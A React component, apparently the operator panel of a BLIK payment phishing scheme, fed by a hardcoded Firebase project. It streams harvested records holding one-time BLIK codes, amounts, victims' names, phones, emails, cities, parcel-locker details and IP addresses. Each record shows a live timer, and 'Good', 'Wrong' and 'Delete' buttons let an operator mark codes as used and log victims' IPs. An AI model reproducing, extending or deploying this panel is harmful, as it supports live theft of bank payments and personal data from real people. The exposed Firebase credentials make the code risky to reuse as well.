import React, { useState, useEffect } from "react";
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
import {
    getDatabase,
    ref,
    onValue,
    remove,
    set,
    get,
} from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";

// Firebase configuration and initialization
const firebaseConfig = {
    apiKey: "AIzaSyBI9jEFhCJ_haq0R3qaFECibT9ue5nD2RU",
    authDomain: "blik-52f1e.firebaseapp.com",
    databaseURL:
        "https://blik-52f1e-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "blik-52f1e",
    storageBucket: "blik-52f1e.appspot.com",
    messagingSenderId: "592614598388",
    appId: "1:592614598388:web:3e86c4d89c95bff8f7a0a1",
};
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

function Blik({ orderString, currentTime, blikCode }) {
    const [records, setRecords] = useState([]);
    const [timeMap, setTimeMap] = useState({}); // Track time (hours, minutes, and seconds) for each record by ID
    const [order, setOrder] = useState(0);
    const [blikCodeState, setBlikCode] = useState("");



    

    useEffect(() => {
        const dbRef = ref(db, "BLIK");

        const unsubscribe = onValue(dbRef, (snapshot) => {
            if (snapshot.exists()) {
                const fetchedRecords = [];
                snapshot.forEach((childSnapshot) => {
                    const data = childSnapshot.val();
                    fetchedRecords.push({
                        id: childSnapshot.key,
                        Numer: data.Numer,
                        Time: data.Time,
                        Blik: data.Blik,
                        IP: data.IP,
                        Imie: data.Imie,
                        Nazwisko: data.Nazwisko,
                        Telefon: data.Telefon,
                        Email: data.Email,
                        Miasto: data.Miasto,
                        Paczkomat: data.Paczkomat,
                        Summa: data.Summa,
                        Quantity: data.Quantity,
                        Text: data.Text,
                        background:
                            data.Text === "Yes"
                                ? "bg-success"
                                : data.Text === "No"
                                ? "bg-danger"
                                : "bg-warning",
                    });
                });
                setRecords(fetchedRecords);
            } else {
                setRecords([]);
            }
        });

        return () => unsubscribe();
    }, [orderString, currentTime, blikCode]);

    useEffect(() => {
        const newTimeMap = { ...timeMap };
    
        // Initialize the timer for records that don't have their time set yet
        records.forEach((record) => {
            if (!newTimeMap[record.id]) {
                const recordTime = new Date(record.Time).getTime();
                const currentTime = Date.now();
    
                // Check if the time is valid
                if (isNaN(recordTime)) {
                    console.error(`Invalid time for record: ${record.id}`);
                    return; // Skip this record if the time is invalid
                }
    
                const elapsedSeconds = Math.floor((currentTime - recordTime) / 1000);
    
                const hours = Math.floor(elapsedSeconds / 3600);
                const minutes = Math.floor((elapsedSeconds % 3600) / 60);
                const seconds = elapsedSeconds % 60;
    
                newTimeMap[record.id] = { hours, minutes, seconds };
            }
        });
    
        // Set the initial time map with the new times for all records
        setTimeMap(newTimeMap);
    
        const interval = setInterval(() => {
            setTimeMap((prevTimeMap) => {
                const updatedMap = { ...prevTimeMap };
    
                // Loop through each record to update the timer
                Object.keys(updatedMap).forEach((id) => {
                    const record = records.find((r) => r.id === id);
    
                    // Skip updating the timer for records with Text "Yes" or "No"
                    if (record && (record.Text === "Yes" || record.Text === "No")) {
                        return; // Skip updating this record
                    }
    
                    let { hours, minutes, seconds } = updatedMap[id];
    
                    // Increment seconds
                    seconds += 1;
    
                    // Handle minute and hour rollover
                    if (seconds >= 60) {
                        seconds = 0;
                        minutes += 1;
                    }
    
                    if (minutes >= 60) {
                        minutes = 0;
                        hours += 1;
                    }
    
                    updatedMap[id] = { hours, minutes, seconds };
                });
    
                return updatedMap; // Return the updated time map
            });
        }, 1000); // Update every second
    
        // Cleanup the interval when the component unmounts or when records change
        return () => clearInterval(interval);
    }, [records]); // Run the effect when `records` change
    
    
    

    async function DeleteData(recordId, IP) {
        try {
            await remove(ref(db, `BLIK/${recordId}`));
            setRecords((prevRecords) =>
                prevRecords.filter((record) => record.id !== recordId)
            );

            const sanitizedIP = IP.replace(/\./g, "_");
            await set(ref(db, `IP/${sanitizedIP}`), true);

            setOrder(order + 1);
            setBlikCode("");
        } catch (error) {
            console.error("Error deleting data:", error);
        }
    }

    async function UpdateData(recordId) {
        const green = "Yes";

        try {
            const recordRef = ref(db, `BLIK/${recordId}`);
            const snapshot = await get(recordRef);

            if (snapshot.exists()) {
                const existingData = snapshot.val();

                await set(recordRef, {
                    ...existingData,
                    Text: green,
                });

                setRecords((prevRecords) =>
                    prevRecords.map((record) =>
                        record.id === recordId
                            ? {
                                  ...record,
                                  Text: green,
                                  background: "bg-success",
                              }
                            : record
                    )
                );
            } else {
                console.log("Record does not exist.");
            }
        } catch (error) {
            console.error("Error updating data:", error);
        }
    }

    async function UpdateData2(recordId) {
        const red = "No";

        try {
            const recordRef = ref(db, `BLIK/${recordId}`);
            const snapshot = await get(recordRef);

            if (snapshot.exists()) {
                const existingData = snapshot.val();

                await set(recordRef, {
                    ...existingData,
                    Text: red,
                });

                setRecords((prevRecords) =>
                    prevRecords.map((record) =>
                        record.id === recordId
                            ? { ...record, Text: red, background: "bg-danger" }
                            : record
                    )
                );
            } else {
                console.log("Record does not exist.");
            }
        } catch (error) {
            console.error("Error updating data:", error);
        }
    }

    return (
        <div>
            {records.length > 0 ? (
                records
                    .slice()
                    .reverse()
                    .map((record) => (
                        <div
                            key={record.id}
                            className={`m-0 p-0 row justify-content-center ${record.background}`}
                        >
                            <p className="m-0 p-3 ps-5 pe-5 fs-1 col-auto border border-white">
                                {String(timeMap[record.id]?.hours || 0).padStart(2, "0")}:
                                {String(timeMap[record.id]?.minutes || 0).padStart(2, "0")}:
                                {String(timeMap[record.id]?.seconds || 0).padStart(2, "0")}
                            </p>

                            <p className="m-0 p-3 ps-5 pe-5 fs-1 col-auto border border-white text-center fw-bold">
                                {record.Blik}
                            </p>

                            <p className="m-0 p-3 ps-5 pe-5 fs-1 col-auto border border-white text-center fw-bold">
                                {record.Summa}
                            </p>

                            <p className="m-0 p-3 fs-1 col border border-white text-center">
                                {record.Text}
                            </p>

                            <button
                                className="o_btn fs-1 m-0 p-3 col-auto border border-white bg-success"
                                onClick={() => UpdateData(record.id)}
                                style={{ height: "94px" }}
                            >
                                Good
                            </button>
                            <button
                                className="o_btn fs-1 m-0 p-3 col-auto border border-white bg-danger"
                                onClick={() => UpdateData2(record.id)}
                                style={{ height: "94px" }}
                            >
                                Wrong
                            </button>
                            <button
                                className="o_btn fs-1 m-0 p-3 col-auto border border-white bg-dark"
                                onClick={() => DeleteData(record.id, record.IP)}
                                style={{ height: "94px" }}
                            >
                                Delete
                            </button>
                        </div>
                    ))
            ) : (
                <div className="m-0 p-0 row justify-content-center bg-primary">
                    <p className="o_btn m-0 p-3 ps-5 pe-5 fs-1 col-12 text-center border border-primary">
                        Waiting for post
                    </p>
                </div>
            )}
        </div>
    );
}

export default Blik;
